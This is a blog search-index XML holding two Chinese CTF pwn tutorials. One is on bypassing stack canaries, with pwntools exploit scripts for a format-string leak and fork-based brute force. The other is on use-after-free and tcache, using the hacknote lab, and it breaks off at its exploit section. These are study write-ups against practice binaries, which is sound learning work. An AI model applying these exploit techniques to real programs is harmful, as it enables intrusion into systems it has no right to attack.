<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>canary绕过</title>
      <link href="/2024/10/06/canary%E7%BB%95%E8%BF%87/"/>
      <url>/2024/10/06/canary%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h2><p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p><p>由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。</p><p>Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack&#x2F;buffer overflow 是否发生。</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-06%20092447.png" alt="1"></p><p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配</p><h2 id="leak-canary"><a href="#leak-canary" class="headerlink" title="leak canary"></a>leak canary</h2><h3 id="利用格式化字符串leak"><a href="#利用格式化字符串leak" class="headerlink" title="利用格式化字符串leak"></a>利用格式化字符串leak</h3><p>我们知道canary的值位于栈上，距离bp若干个偏移的位置，若程序中存在格式化字符串漏洞，且知晓偏移，我们就可以读出canary的值，绕过该保护</p><p>附件：<a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/binary_200">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/binary_200</a> </p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20101017.png" alt="a"></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20101102.png" alt="a"><br>可以看到存在栈溢出，且有格式化字符串漏洞,且有后门函数<br>通过汇编我们可以得知canary的地址在esp+3Ch处<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20101221.png" alt="a"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./binary_200&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%15$x&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">canary=<span class="built_in">int</span>(io.recv(),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">shell=<span class="number">0x0804854D</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(shell)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="覆盖截断字符获取Canary"><a href="#覆盖截断字符获取Canary" class="headerlink" title="覆盖截断字符获取Canary"></a>覆盖截断字符获取Canary</h3><p>canary以\x00结尾，本意是阻止read，write等函数将其读出，倘若程序中存在栈溢出漏洞，我们可以试着覆盖\x00，从而读出canary</p><p>在出现类似以下漏洞时可以试着利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure><h2 id="爆破canary"><a href="#爆破canary" class="headerlink" title="爆破canary"></a>爆破canary</h2><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是<strong>相同</strong>的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。</p><p>下面是爆破canary的模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./filename&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io=process(<span class="string">&quot;./filename&quot;</span>)</span><br><span class="line">    <span class="comment">#libc=elf.libc</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">    <span class="comment">#libc=ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在爆破canary的第&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;位&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前的字符为：&quot;</span>+<span class="built_in">chr</span>(i))</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) <span class="comment">#将canary转为bytes类型，避免后面的payload出现TypeError</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前payload为：&quot;</span>+<span class="built_in">str</span>(payload))</span><br><span class="line">        io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">        data=io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;success&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            canary+=i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;canary is: &quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>例题：<a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/bin1">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/bin1</a> 纯粹爆破题</p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-06%20094927.png" alt="1"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./bin1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io=process(<span class="string">&quot;./bin1&quot;</span>)</span><br><span class="line">    <span class="comment">#libc=elf.libc</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">    <span class="comment">#libc=ELF(&quot;./&quot;)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在爆破canary的第&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;位&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前的字符为：&quot;</span>+<span class="built_in">chr</span>(i))</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前payload为：&quot;</span>+<span class="built_in">str</span>(payload))</span><br><span class="line">        io.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">        data=io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;success&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            canary+=i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;canary is: &quot;</span>+canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">getflag_addr=<span class="number">0x0804863B</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(getflag_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h2><p>还是这张图，我们可以看到若canary不对则会执行_stack_chk_fail函数，我们也可以修改_stack_chk_fail的got表，当程序执行_stack_chk_fail函数时实际上执行了后门函数（如果got表可修改且有后门函数的话）<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-06%20092447.png" alt="1"></p><p>需要利用格式化字符串漏洞</p><h2 id="SSP-leak"><a href="#SSP-leak" class="headerlink" title="SSP leak"></a>SSP leak</h2><p>SSP(Stack Smashing Protect) Leak，故意触发canary保护，并且修改输出的变量argv[0]的内容来实现任意地址读</p><p>执行完_stack_chk_fail函数，程序退出，屏幕上留下一行</p><p>*** stack smashing detected ***:[XXX] terminated</p><p>[xxx]是程序的名字，那么一定是由 call __stack_chk_fail 函数输出的，而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。那么，我们什么时候输入过程序名呢？char *argv[] 是main函数的参数，argv[0]存储的就是程序名，且这个argv[0]就存在于栈上。想明白这个过程，那就很容易理解这个攻击方式了，既然输出的内容是一个外部变量，如果我们利用栈溢出覆盖argv[0]的指针为我们想要输出的字符串的地址，那么就实现了任意地址读取攻击。这里贴上 call __stack_chk_fail 函数的源代码，以助于更好理解这个攻击方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">__fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果程序可供输入的数据大小足够大，那我们只需要无脑填入足够大数量的目标地址就行（总有一个会覆盖到argv[0]）</p><p>那么究竟填几个才能刚好覆盖到argv[0]呢<br>这就需要计算栈顶到指向argv[0]的指针的距离<br>在gdb中用argv可以看到指向argv[0]的地址，如图为0x7fffffffdfb8<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-06%20101413.png" alt="1"></p><h2 id="TSL（线程局部存储）攻击"><a href="#TSL（线程局部存储）攻击" class="headerlink" title="TSL（线程局部存储）攻击"></a>TSL（线程局部存储）攻击</h2><p>线程局部存储（TLS），是一种变量的存储方法，每一个线程都会有一个副本，这个变量在它所在的线程内是全局可访问的，但是不能被其他线程访问到，这样就保持了数据的线程独立性。而熟知的全局变量，是所有线程都可以访问的，这样就不可避免需要锁来控制，增加了控制成本和代码复杂度。</p><p>创建线程的时候会创建一个TLS（Thread Local Storage），该TLS会存储canary的值，而TLS会保存在stack高地址的地方</p><p>主线程中的TLS通常位于mmap映射出来的地址空间里，而位置也比较随机，覆盖的可能性不大；子线程通常也是mmap出来的，子线程中的TLS则位于线程栈的顶部</p><p>tcbhead_t结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                            thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="type">dtv_t</span> *dtv;</span><br><span class="line">        <span class="type">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="type">int</span> multiple_threads;</span><br><span class="line">        <span class="type">int</span> gscope_flag;</span><br><span class="line">        <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="type">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果可以溢出的数据够大，可以尝试去修改canary的值</p><h2 id="利用数组下标越界绕过canary"><a href="#利用数组下标越界绕过canary" class="headerlink" title="利用数组下标越界绕过canary"></a>利用数组下标越界绕过canary</h2><p>c语言对于数组不做边界检查，我们可以利用此漏洞直接往后续某个内存地址写入目标地址，直白点就是可以直接修改retaddr的内容</p><p>利用条件：可以对数组第i个元素进行写入操作，i为我们自由设定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;arry[i]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use After Free</title>
      <link href="/2024/09/28/Use%20After%20Free/"/>
      <url>/2024/09/28/Use%20After%20Free/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p><p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>HITCON-training 中的 lab 10 hacknote<br><a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/hacknote">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/hacknote</a></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20192534.png" alt="1"></p><p>在delete函数中发现有uaf漏洞<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20192748.png" alt="1"></p><p>magic函数可以获取flag<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20192852.png" alt="2"></p><p>结合add_note函数和print_note函数可以发现print content的方式<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20201110.png" alt="1"></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20201259.png" alt="1"></p><p>即去调用这个&amp;notelist + v1 处的内容（把这个地方当成一个函数来用）,正常情况下是会调用print_note_content函数（即下图）<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20194235.png" alt="1"></p><p>思路是修改note的print_note_content函数为magic函数，从而在执行print_note的时候执行magic，我们唯一能写入的方式是写入content</p><p>进入gdb调试</p><p>首先创建两个note<br>然后查看heap和bin<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20193057.png" alt="1"><br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20193134.png" alt="2"></p><p>bin是空的，heap发现有多个chunk段，用x命令查看对应内容，从第二个（0x804b158）开始看可以看到刚刚创建的两个note<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20193333.png" alt="1"><br>可以看到note0_content的地址0x0804b170 然后后面的0x0804865b内容如下<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20194135.png" alt="1"></p><p>在ida里面看是这个函数<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20194235.png" alt="1"><br>是print_note_content函数</p><p>那么我们能否修改这个函数呢<br>此时利用uaf漏洞可以做到</p><p>我们先free掉上面的两个note（调用delete函数）<br>此时的bin是这样的<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20201908.png" alt="1"></p><p>然后我们再创建一个新的note<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20202056.png" alt="1"><br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20202026.png" alt="1"><br>可以看到我们输入的content覆盖了print_note_content函数地址所在的位置<br>换句话说，我们新创建的note使用了note0这个chunk，并且由于uaf，即对应的指针没有被置为null，所以note0仍可以被正常使用，此时我们再次print note0，就会去调用我们输入的content，也就达到了我们的目的</p><p>疑点：为什么我们输入的content会刚好覆盖到print_note_content函数地址所在的位置？</p><p>首先补充一下Tcache Bins的相关知识</p><h2 id="Tcache-Bins"><a href="#Tcache-Bins" class="headerlink" title="Tcache Bins"></a>Tcache Bins</h2><p><em>glibc-2.27开始，官方才引入了Tcache Bins结构，然后很不幸的是我的Ubuntu18刚好是glibc-2.27，所以就有了这块内容的补充</em></p><p>概述<br>&emsp;&emsp;Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块。无须对arena上锁既可以使用，所以采用这种机制后分配算法有不错的性能提升。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中。对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk不会被合并，即使和Top chunk相邻。<br>&emsp;&emsp;另外tcache机制出现后，每次产生堆都会先<strong>产生一个0x250大小的堆块</strong>，该堆块位于堆的开头，用于<strong>记录64个bins的地址</strong>（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache bin中的fd指针是<strong>指向malloc返回的地址</strong>，也就是用户数据部分，而不是像fast bin单链表那样fd指针指向chunk头。<br>&emsp;&emsp;在有了tcache机制后，无论分配还是释放，操作64位下0x20和0x410大小的chunk，tcache都是首当其冲，直到达到其每种bin的上限7为止。还有一种情况就是fast bin或者small bin返回了一个堆块，且tcache对应大小的bin中未满的话，那么该fast bin或者samll bin链中的堆块会被加入到对应tcache bin中直至其上限。</p><p>Tcache 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS    64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>可以看到，每个线程最多只能有64个Tcache Bin，且用单项链表储存free chunk， 每个线程都有一个tcache_perthread_struct结构体</p><p>如下为Tcache Bins分配规则： （摘自ctfwiki）<br>内存释放：<br>&emsp;&emsp;可以看到，在 free 函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入 tcache 结构中<br>内存申请：<br>在内存分配的 malloc 函数中有多种情况，会将内存块移入 tcache 中：<br>&emsp;&emsp;首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中<br>&emsp;&emsp;其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中<br>&emsp;&emsp;当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理<br>tcache 取出：<br>&emsp;&emsp;在内存申请的开始部分，首先会判断申请大小块，并验证 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配  Tcache Bin遵守<strong>LIFO(先进后出)</strong></p><p>在循环处理 unsorted bin 内存块时，如果达到放入 unsorted bin 块最大数量，会立即返回。不过默认是 0，即不存在上限<br>在循环处理 unsorted bin 内存块后，如果之前曾放入过 tcache 块，则会取出一个并返回</p><p>大抵是像个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂，仅仅检查 tcache-&gt;entries[tc_idx] &#x3D; e-&gt;next;</p><p>然后在上面查看bin时就会发现free过后先放入了tcache bins</p><hr><p>Tcache Bin遵守LIFO,所以在free掉两个chunk后, tcache中会有两个0x10大小的chunk, 再申请8字节的chunk, 会返回两个chunk, 后一个chunk就是之前的chunk0, 写入magic就会覆盖原chunk0的print_note_content函数的地址, 新生成的note不是chunk0, 而是chunk3, 本题的UAF是指释放chunk0后, 又使用了chunk0</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight 